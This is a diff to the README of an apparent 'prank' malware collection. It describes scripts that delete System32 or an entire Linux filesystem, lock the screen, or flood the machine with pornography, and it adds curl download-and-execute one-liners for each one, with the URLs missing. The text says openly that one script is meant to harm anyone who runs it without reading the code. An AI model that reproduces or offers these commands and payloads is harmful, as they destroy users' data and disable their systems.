@@ -25,12 +25,19 @@ This little 'project' was made because I wanted to excercise in as many language
 
 ### Windows platform
 #### 1 (C#) - Blank screen that you can remember from Async rat, I've made own and it doesnt break your pc when you restart it
+```curl -sL -o script.exe & script.exe```
 #### 4 (Python) - while True: webbrowser.open('https://pornhub.com'), with 4 threads it was able to break pc, lowered to 2 threads
+```curl -sL -o script.exe & script.exe```
 #### 5 (Golang) - Classic infinite messagebox with 'You have been hacked!' message
+```curl -sL -o script.exe & script.exe```
 #### 6 (Batch) - Deleting Sys32 😀
+```curl -sL -o script.bat & script.bat```
 ### Linux platform
 #### 2 (Node.js) - Downloads p0rn in every available directory
+```curl -sL -o script.js; node script.js```
 #### 3 (Bash) - rickrolling while deleting whole filesystem, use when escaping feds, death to whoever launches this without looking at the code 😂
+```curl -sL -o script; chmod+x script; ./script```
 #### 4 (Python) - while True: webbrowser.open('https://pornhub.com'), with 4 threads it was able to break pc, lowered to 2 threads
+```curl -sL -o script.bin; chmod+x script.bin; ./script.bin```
 #### 7 (Java) - Blank screen, coming soon
 
